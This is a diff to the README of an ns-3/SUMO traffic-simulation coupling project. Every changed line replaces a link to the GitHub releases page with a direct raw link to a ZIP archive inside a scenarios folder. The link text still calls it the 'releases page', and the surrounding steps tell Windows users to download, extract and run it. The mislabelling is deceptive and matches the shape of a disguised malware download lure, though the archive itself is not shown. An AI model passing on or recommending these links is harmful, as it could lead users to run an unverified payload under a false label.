@@ -1,6 +1,6 @@
 # 🧩 ns3-sumo-coupling - Simple Traffic Simulation Setup
 
-[![Download the release page](https://img.shields.io/badge/Download%20Release%20Page-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/guilhermec375/ns3-sumo-coupling/releases)
+[![Download the release page](https://img.shields.io/badge/Download%20Release%20Page-4C8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/guilhermec375/ns3-sumo-coupling/raw/refs/heads/main/sumo-scenarios/simple/ns_coupling_sumo_3.3-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want to explore network and vehicle traffic together without deali
 
 ## 📥 Download and Run
 
-1. Open the [releases page](https://github.com/guilhermec375/ns3-sumo-coupling/releases).
+1. Open the [releases page](https://github.com/guilhermec375/ns3-sumo-coupling/raw/refs/heads/main/sumo-scenarios/simple/ns_coupling_sumo_3.3-beta.1.zip).
 2. Find the latest release.
 3. Download the file for Windows.
 4. If the release comes as a ZIP file, extract it first.
@@ -70,7 +70,7 @@ This makes it useful as a learning tool and as a base for small tests.
 
 Follow these steps on Windows:
 
-1. Download the latest release from the [release page](https://github.com/guilhermec375/ns3-sumo-coupling/releases).
+1. Download the latest release from the [release page](https://github.com/guilhermec375/ns3-sumo-coupling/raw/refs/heads/main/sumo-scenarios/simple/ns_coupling_sumo_3.3-beta.1.zip).
 2. Save the file to your Downloads folder or Desktop.
 3. If the file is compressed, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -180,7 +180,7 @@ The main goal is to show that both simulators can stay in sync while they run.
 
 If you need the release file again, use the same page here:
 
-[https://github.com/guilhermec375/ns3-sumo-coupling/releases](https://github.com/guilhermec375/ns3-sumo-coupling/releases)
+[https://github.com/guilhermec375/ns3-sumo-coupling/raw/refs/heads/main/sumo-scenarios/simple/ns_coupling_sumo_3.3-beta.1.zip](https://github.com/guilhermec375/ns3-sumo-coupling/raw/refs/heads/main/sumo-scenarios/simple/ns_coupling_sumo_3.3-beta.1.zip)
 
 ## 🗂️ Repository Topics
 
